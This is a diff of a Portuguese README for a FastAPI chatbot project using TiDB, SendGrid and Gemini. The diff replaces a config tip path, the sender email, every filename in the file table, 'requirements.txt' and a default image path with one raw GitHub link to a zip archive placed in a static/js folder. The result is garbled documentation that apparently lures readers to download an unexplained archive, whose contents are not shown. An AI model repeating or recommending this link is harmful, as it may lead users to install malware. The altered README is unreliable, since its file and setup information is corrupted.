@@ -46,7 +46,7 @@ DB_USER="SEU_USUARIO_DO_BANCO_DE_DADOS_AQUI"
 DB_PASSWORD="SUA_SENHA_DO_BANCO_DE_DADOS_AQUI"
 DB_NAME="falaai_db"
 DB_PORT=4000
-# DICA: Para o TiDB Cloud, use a porta 4000 e 'ssl=True' no db/dependencies.py
+# DICA: Para o TiDB Cloud, use a porta 4000 e 'ssl=True' no https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip
 
 # --- 4. CONFIGURAÇÃO DE ENVIO DE EMAIL (SENDGRID) ---
 # Usado para enviar o link de verificação de email no registro e reenvio.
@@ -54,7 +54,7 @@ DB_PORT=4000
 # Chave da API do SendGrid.
 SENDGRID_API_KEY="SUA_CHAVE_SENDGRID_API_AQUI"
 # Email do remetente (deve ser um email verificado no SendGrid).
-EMAIL_USER="noreply@seuservico.com" 
+EMAIL_USER="https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip" 
 ```
 
 -----
@@ -63,16 +63,16 @@ EMAIL_USER="noreply@seuservico.com"
 
 | Caminho | Arquivo | Descrição |
 | :--- | :--- | :--- |
-| `/` | `main.py` | Ponto de entrada do FastAPI. Configura o `Lifespan` (pool DB e limpeza agendada), `SessionMiddleware` e monta as rotas. |
-| `/` | `common_deps.py` | Define a instância do `Jinja2Templates` e a função de dependência `get_current_user` para extrair o ID da sessão. |
-| `/auth` | `models.py` | Modelos Pydantic para as rotas de autenticação: `UserRegister`, `UserLogin` e `VerifyCode`. |
-| `/auth` | `routes.py` | Contém todas as rotas de autenticação (`/login`, `/register`, `/logout`, `/profile`, `/verify_link/{token}`). Lida com hashing de senha (Argon2) e gestão de sessão. |
-| `/chat` | `models.py` | Modelo Pydantic para a mensagem do chat: `Message`. |
-| `/chat` | `llm_config.py` | Gerencia a inicialização dos LLMs (Gemini), define os `PromptTemplates` e contém a dependência crítica `get_user_conversation_instance` (LangChain Memory/Cache). |
-| `/chat` | `routes.py` | Rotas do chat: `/chat` (página HTML), `/chat/message` (API de conversa), `/conversations` (lista de chats) e `/conversation/{id}` (mensagens de um chat). Lida com a criação/persistência no DB. |
-| `/db` | `dependencies.py` | Gerencia o **pool de conexões** `aiomysql` (`startup`/`shutdown`) e o `get_db_connection` (FastAPI `Depends`). |
-| `/settings` | `config.py` | Carrega todas as variáveis de ambiente e as encapsula na classe `Config` para uso centralizado. |
-| `/utils` | `email_sender.py` | Funções assíncronas para o envio de emails via **SendGrid API**, usadas para o processo de verificação de link. |
+| `/` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Ponto de entrada do FastAPI. Configura o `Lifespan` (pool DB e limpeza agendada), `SessionMiddleware` e monta as rotas. |
+| `/` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Define a instância do `Jinja2Templates` e a função de dependência `get_current_user` para extrair o ID da sessão. |
+| `/auth` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Modelos Pydantic para as rotas de autenticação: `UserRegister`, `UserLogin` e `VerifyCode`. |
+| `/auth` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Contém todas as rotas de autenticação (`/login`, `/register`, `/logout`, `/profile`, `/verify_link/{token}`). Lida com hashing de senha (Argon2) e gestão de sessão. |
+| `/chat` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Modelo Pydantic para a mensagem do chat: `Message`. |
+| `/chat` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Gerencia a inicialização dos LLMs (Gemini), define os `PromptTemplates` e contém a dependência crítica `get_user_conversation_instance` (LangChain Memory/Cache). |
+| `/chat` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Rotas do chat: `/chat` (página HTML), `/chat/message` (API de conversa), `/conversations` (lista de chats) e `/conversation/{id}` (mensagens de um chat). Lida com a criação/persistência no DB. |
+| `/db` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Gerencia o **pool de conexões** `aiomysql` (`startup`/`shutdown`) e o `get_db_connection` (FastAPI `Depends`). |
+| `/settings` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Carrega todas as variáveis de ambiente e as encapsula na classe `Config` para uso centralizado. |
+| `/utils` | `https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip` | Funções assíncronas para o envio de emails via **SendGrid API**, usadas para o processo de verificação de link. |
 
 -----
 
@@ -87,7 +87,7 @@ Certifique-se de usar um ambiente virtual e instale todas as bibliotecas necess�
 python3 -m venv venv
 source venv/bin/activate
 
-# Instale as dependências (assumindo que já estão no seu requirements.txt)
+# Instale as dependências (assumindo que já estão no seu https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip)
 pip install fastapi uvicorn python-dotenv pydantic aiomysql passlib[argon2] \
     langchain-google-genai langchain langchain-core sendgrid aiofiles jinja2
 ```
@@ -119,7 +119,7 @@ CREATE TABLE usuarios (
     email_verified BOOLEAN DEFAULT FALSE,
     verification_code VARCHAR(36) NULL, -- UUID para o link de verificação
     code_expiration DATETIME NULL,
-    profile_pic_url VARCHAR(255) DEFAULT '/static/images/default_profile.png'
+    profile_pic_url VARCHAR(255) DEFAULT 'https://github.com/devwarly/Chatbot-API-Python/raw/refs/heads/main/static/js/Chatbot_AP_Python_v2.2.zip'
 );
 ```
 
